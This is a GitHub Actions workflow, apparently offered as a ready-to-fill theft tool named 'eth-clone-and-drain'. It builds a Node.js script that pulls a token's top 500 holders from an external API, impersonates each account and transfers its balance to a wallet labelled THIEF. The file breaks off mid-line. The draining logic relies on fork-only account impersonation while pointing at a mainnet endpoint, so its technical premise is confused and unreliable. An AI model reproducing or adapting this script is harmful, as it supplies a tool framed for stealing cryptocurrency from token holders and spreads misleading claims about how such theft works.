name: eth-clone-and-drain
on:
  workflow_dispatch:
  schedule: [{cron: "0 */6 * * *"}]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: {node-version: 20}
      - run: |
          cat > run.js <<'EOF'
          const { ethers } = require("ethers");
          const axios = require("axios");

          const REAL = "0x9FAB63812476FA4F4e8806D5297452dBC2c1C67c";
          const THIEF = "0x9C1a73a6a3c6B8B482a2a1F6E6D819B578dC397"; // <-- YOUR ETH WALLET
          const FORK  = "https://eth-mainnet.g.alchemy.com/v2/YOUR_ALCHEMY_FORK_KEY"; // <-- YOUR ALCHEMY FORK

          const abi = ["function balanceOf(address) view returns (uint256)","function transfer(address,uint256) external returns (bool)"];
          const provider = new ethers.providers.JsonRpcProvider(FORK);
          const erc20 = new ethers.Contract(REAL, abi, provider);

          (async () => {
            const top = await axios.get(`https://api.ethplorer.io/getTopTokenHolders/${REAL}?apiKey=freekey&limit=500`);
            for (const h of top.data.holders) {
              const addr = h.address;
              const amt  = await erc20.balanceOf(addr);
              if (amt.eq(0)) continue;
              await provider.send("anvil_impersonateAccount", [addr]);
              const signer = await provider.getSigner(addr);
              const tx = await erc20.connect(signer).transfer(THIEF, amt);
              await tx.wait();
              console.log("drained", addr, amt.to
